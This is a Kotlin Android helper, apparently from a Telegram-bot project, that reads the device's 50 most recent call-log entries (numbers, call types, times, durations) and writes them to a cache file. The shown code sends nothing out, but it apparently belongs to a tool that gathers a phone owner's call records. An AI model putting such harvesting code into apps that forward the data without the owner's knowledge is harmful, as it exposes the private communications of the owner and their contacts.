package com.example.telegrambot.helpers

import android.content.Context
import android.provider.CallLog
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object CallLogHelper {
    fun getCallLogsFile(context: Context): File? {
        val file = File(context.cacheDir, "call_logs.txt")
        try {
            val writer = FileWriter(file)
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null, CallLog.Calls.DATE + " DESC LIMIT 50"
            )
            
            cursor?.use {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                
                while (it.moveToNext()) {
                    val number = it.getString(numberIndex)
                    val type = it.getInt(typeIndex)
                    val date = sdf.format(Date(it.getLong(dateIndex)))
                    val duration = it.getString(durationIndex)
                    
                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        else -> "OTHER"
                    }
                    
                    writer.append("[$date] $typeStr - $number ($duration sec)\n")
                }
            }
            writer.flush()
            writer.close()
            return file
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }
}
